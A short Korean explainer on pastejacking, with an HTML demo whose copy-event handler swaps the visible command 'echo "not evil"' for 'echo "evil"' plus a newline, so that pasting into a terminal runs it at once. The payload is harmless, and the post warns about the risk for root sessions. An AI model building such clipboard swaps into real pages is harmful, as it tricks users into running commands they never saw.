```html
<html>
 	<p>echo "not evil"</p>
 	<script>
 		document.addEventListener('copy', function(e) {
 			console.log(e);
 			e.clipboardData.setData('text/plain', 'echo "evil"\r\n');
 			e.preventDefault();
 		});
 	</script>
</html>
```

페이스트 재킹이라고, 카피 이벤트를 핸들링해서 유저가 보고 있는 화면과, 복사된 화면이 다르게 하는 경우가 있다. 위의 경우에는 echo "not evil" 이 실행될 거라 예상하고 복사해서 터미널에 붙이는 순간, 실제로는 echo "evil"이 실행된다. 물론 대부분 관리자 권한에 대해서는 따로 체크하겠지만, root 계정으로 접속되어 있는 상태라면 문제가 발생할 수도 있겠다.
